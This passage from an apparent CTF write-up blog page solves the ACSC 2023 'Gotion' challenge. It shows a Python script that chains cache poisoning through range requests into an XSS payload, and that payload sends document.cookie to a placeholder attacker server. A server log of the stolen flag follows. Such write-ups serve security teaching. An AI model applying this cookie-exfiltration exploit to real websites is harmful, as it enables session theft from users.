</code></pre></div><h3 id="solution-script">Solution script<a href="#solution-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests

<span style="color:#75715e"># HOST = &#39;http://gotion-2.chal.ctf.acsc.asia:30080&#39;</span>
HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:30080&#39;</span>

<span style="color:#75715e"># Now the 4096th byte is a &#34;&lt;&#34;</span>
<span style="color:#75715e"># Setting allow_redirects=False to avoid reading the note after it is created.</span>
<span style="color:#75715e"># This is to prevent the HTTP response getting cached.</span>
r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/new-note&#39;</span>, data<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;title&#39;</span>: <span style="color:#e6db74">&#39;mp4&#39;</span>,
    <span style="color:#e6db74">&#39;body&#39;</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">622</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>
}, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)

note_url <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;location&#39;</span>)

note_id <span style="color:#f92672">=</span> note_url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]

r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}{</span>note_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;range&#39;</span>: <span style="color:#e6db74">&#39;bytes=0-0&#39;</span>
})
<span style="color:#75715e"># Now the first cache ends with a &#39;&lt;&#39;</span>

r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">/update-note&#39;</span>, data<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;noteId&#39;</span>: note_id,
    <span style="color:#e6db74">&#39;title&#39;</span>: <span style="color:#e6db74">&#39;mp4&#39;</span>,
    <span style="color:#e6db74">&#39;body&#39;</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">623</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?$</span><span style="color:#e6db74">{document.cookie}</span><span style="color:#e6db74">` src=http://MY_SECRET_SERVER:4444/1 &#39;</span>
}, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)

r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}{</span>note_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;range&#39;</span>: <span style="color:#e6db74">&#39;bytes=4096-4096&#39;</span>
})
<span style="color:#75715e"># ...and the second cache starts with &#39;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=http://MY_SECRET_SERVER:4444/1 &lt;/pre&gt;&#39;</span>

<span style="color:#75715e"># report this link to the server!</span>
print(note_url[<span style="color:#ae81ff">1</span>:])

<span style="color:#75715e"># ACSC{character_appears_at_the_last_of_video_is_shobon_not_amongus}</span>
<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74"># Logs from MY_SECRET_SERVER:4444
</span><span style="color:#e6db74">35.194.228.105 - - [25/Feb/2023 22:08:56] code 404, message File not found
</span><span style="color:#e6db74">35.194.228.105 - - [25/Feb/2023 22:08:56] &#34;GET /1 HTTP/1.1&#34; 404 -
</span><span style="color:#e6db74">35.194.228.105 - - [25/Feb/2023 22:08:56] code 404, message File not found
</span><span style="color:#e6db74">35.194.228.105 - - [25/Feb/2023 22:08:56] &#34;GET /2?FLAG=ACSC</span><span style="color:#e6db74">{character_appears_at_the_last_of_video_is_shobon_not_amongus}</span><span style="color:#e6db74"> HTTP/1.1&#34; 404 -
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</code></pre></div><section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Mark McGranaghan and Eli Bendersky (2022) &ldquo;Go by Example: Struct Embedding&rdquo;<br>
<a href="https://gobyexample.com/struct-embedding">https://gobyexample.com/struct-embedding</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://mystiz.hk/posts/2023/2023-06-26-google-ctf-mhk2/">
                <span class="button__icon">←</span>
                <span class="button__text">Google CTF 2023: MHK2</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://mystiz.hk/posts/2023/2023-03-12-idekctf/">
                <span class="button__text">idekCTF 2022* Writeup</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>


<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    ACSC 2023 Quals (I): Gotion and easySSTI
  </a>
  <div class="js-toc"></div>
</aside>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
      headingSelector: 'h1, h2, h3, h4',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
</script>



  </div>
  <aside class="ads">
    
  
  <ins class="adsbygoogle"
    style="display:block"
    data-ad-client="ca-pub-3220069814773012"
    data-ad-slot="6927401005"
    data-ad-format="auto"
    data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>


  </aside>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2024 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://mystiz.hk/assets/main.js"></script>
<script src="https://mystiz.hk/assets/prism.js"></script>






<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/viz.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/full.render.js"></script>
<script>
var viz = new Viz();

document.querySelectorAll("[class=graphviz]").forEach(node => {
  const escape = function (s) {
    const t = s.replace(/&amp;/g, '&')
    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
  }
  viz.renderSVGElement(escape(node.innerText), {
    engine: 'dot'
  }).then(function (element) {
    node.parentNode.appendChild(element)
    node.style.display = 'none'
  })
})
</script>
<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
    startOnLoad: true,
    htmlLabels: true,
    securityLevel: "loose",
    theme: 'base',
    themeVariables: {
        background: '#22222c',
        primaryColor: '#33333c',
        primaryTextColor: '#ffe4e1',
    }
});
</script>
<link href="https://cdn.jsdelivr.net/npm/js-sequence-diagram@2.0.1/dist/sequence-diagram-min.min.css" rel="stylesheet" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/snapsvg@0.5.1/dist/snap.svg-min.min.js" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/underscore@1.13.6/underscore-min.min.js" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/js-sequence-diagram@2.0.1/dist/sequence-diagram.min.js" crossorigin="anonymous"
  onload="
    Array.from(document.getElementsByClassName('sequence-diagram')).forEach(dom => {
      const content = new DOMParser().parseFromString(dom.innerHTML, 'text/html').documentElement.textContent;
      dom.innerHTML = '';
      Diagram.parse(content).drawSVG(dom, {
        theme: 'simple',
        'font-family': 'Fira Code'
      })
    })"></script>


  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2VLBDVW913"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-2VLBDVW913');
</script>




  
</div>

</body>
</html>
